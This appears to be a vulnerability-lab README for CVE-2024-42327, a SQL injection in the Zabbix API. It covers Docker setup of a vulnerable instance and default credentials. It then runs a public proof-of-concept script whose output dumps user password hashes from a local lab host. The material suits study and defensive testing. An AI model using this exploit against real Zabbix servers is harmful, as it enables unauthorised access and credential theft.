# Title
A non-admin user account on the Zabbix frontend with the default User role, or with any other role that gives API access can exploit this vulnerability. An SQLi exists in the CUser class in the addRelatedObjects function, this function is being called from the CUser.get function which is available for every user who has API access.

Vulnerable versions:
6.0.0–6.0.31, 6.4.0–6.4.16 and 7.0.0.

## Metrics
CVSSv2: N\A   
CVSSv3: 9.9 (Critical)

## Vulnerability Environment
Build and run:
```bash
docker compose build
docker compose up -d
```
Find Zabbix Web IP:
```bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' zabbix-web-nginx-mysql
```
Default login/password:
`Admin:zabbix`

Stop Environment and remove network
```bash
docker compose down
docker network rm zabbix-cve-2024-42327-net
```

## Detection and exploitation example
### PoC Exlpoitation:
```bash
git clone https://github.com/aramosf/cve-2024-42327.git
```
```bash
❯ python3 cve-2024-42327.py -u "http://172.90.240.1:8080/api_jsonrpc.php" -n Admin -p 'zabbix'   
Valid session token: 649f9fe1a5cbbafa5a68b30a473037cc
Admin, Zabbix, Administrator, 1, $2y$10$92nDno4n0Zm7Ej7Jfsz8WukBfgSS/U0QkIuu8WkJPihXBb2A1UrEK
guest, guest, , 2, $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06
user, user, , 3, $2y$10$vu4VHsEyUnjEJaG8VIDPXewncu3eMQfZtYlD5JmjnRQP97pzRGXo.

# Default guest
❯ python3 cve-2024-42327.py -u "http://172.90.240.1:8080/api_jsonrpc.php" -n guest -p ''
Valid session token: 2ec325bca4aea414ee037b90a5fec463

# User with API access (User role and Guest group)
❯ python3 cve-2024-42327.py -u "http://172.90.240.1:8080/api_jsonrpc.php" -n user -p 'p@$$w0rd1234'
Valid session token: 577d935e6c4bd7b9c6e1895fcc00b666
guest, guest, , 2, $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06
user, user, , 3, $2y$10$vu4VHsEyUnjEJaG8VIDPXewncu3eMQfZtYlD5JmjnRQP97pzRGXo.
```

## Exploits and PoCs
[https://github.com/aramosf/cve-2024-42327](https://github.com/aramosf/cve-2024-42327)

## Nuclei Template

## CTF Rooms

## References
[SecurityOnline.info: PoC Exploit Releases for Critical Zabbix Vulnerability – CVE-2024-42327](https://securityonline.info/poc-exploit-releases-for-critical-zabbix-vulnerability-cve-2024-42327/)   
[NIST: CVE-2024-42327](https://nvd.nist.gov/vuln/detail/CVE-2024-42327)   
[Github: zabbix-docker](https://github.com/zabbix/zabbix-docker/)   
[Docker Hub: zabbix](https://hub.docker.com/u/zabbix)   
[Zabbix Documentation: Installation from containers](https://www.zabbix.com/documentation/current/en/manual/installation/containers)   
